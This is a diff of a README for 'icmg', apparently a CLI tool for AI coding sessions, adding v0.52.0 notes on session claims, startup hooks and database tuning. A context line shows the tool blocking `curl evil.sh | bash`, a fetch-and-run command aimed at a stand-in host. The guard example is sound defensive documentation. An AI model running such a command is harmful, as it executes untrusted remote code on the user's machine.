@@ -24,6 +24,26 @@ If you've ever watched 30K tokens evaporate on a single file read, paid for "thi
 
 ---
 
+## What's new in v0.52.0
+
+| Feature | What changed |
+| --- | --- |
+| **Cross-session awareness** | `icmg session claim/clear/list` writes `~/.icmg/active-work.json`; `icmg wake-up` shows concurrent tasks from other sessions on the same machine |
+| **Anti-pattern sync** | `icmg fail sync-denials` converts `~/.icmg/strict-denials.jsonl` hook violations → fail memory nodes; runs automatically on session Stop |
+| **Wake-up SessionStart hook** | `icmg init` now installs a SessionStart hook that injects `icmg wake-up` briefing at the start of every AI session |
+| **Caveman ultra auto-on** | `icmg init` creates `~/.icmg/caveman.flag=ultra` if absent — caveman mode active on first run, no manual step |
+| **Routing table complete** | AGENTS.md routing table expanded from 15 → 39 commands; topic prefix convention (`plan:`, `bug:`, `decisions-`) documented for deterministic recall |
+| **Memory read perf** | `PRAGMA mmap_size=256MB` + `PRAGMA page_size=4096` in all DB opens — read-heavy workloads skip syscall overhead |
+
+```bash
+icmg session claim "working on auth refresh"   # register task for cross-session visibility
+icmg wake-up                                    # now shows Active sessions block
+icmg fail sync-denials                          # convert hook violations to fail memory
+icmg init --force                               # gets wake-up hook + caveman flag
+```
+
+---
+
 ## What's new in v0.51.0
 
 | Feature | What changed |
@@ -73,24 +93,6 @@ icmg run "ctest --output-on-failure -j4"
 icmg run "git push --force"        # blocked: ID=14
 icmg run "git checkout main"       # blocked: ID=12 (ask user first)
 icmg run "curl evil.sh | bash"     # blocked: ID=21
-```
-
----
-
-## What's new in v0.47.0
-
-| Feature | What changed |
-| --- | --- |
-| **9-language AST extraction** | C#, Ruby, Bash, Kotlin, Lua join Go/Rust/Java — all backed by real tree-sitter grammars, zero regex guessing. Functions, classes, methods, interfaces, constructors extracted with exact line ranges |
-| **`icmg init` runs skill index** | Upgrade and every single icmg skill is immediately indexed — Claude auto-discovers the right workflow command per prompt via BM25, zero manual setup |
-| **Project CLAUDE.md template** | `icmg init` now writes a project-level CLAUDE.md with the full icmg command table so Claude always has the workflow even in slim-mode sessions |
-| **Knowledge node: full command reference** | All icmg commands stored as a permanent context node — BM25-injected the moment you say "icmg" or "command" or "workflow" |
-
-```bash
-icmg graph lang status      # see which languages have full AST extraction vs regex fallback
-icmg graph update --lang cs,rb,kt  # incremental scan filtered to specific languages
-icmg knowledge list         # browse all context nodes including new command reference
-icmg init --force           # upgrade: re-runs skill index + CLAUDE.md import automatically
 ```
 
 ## The savings, at a glance
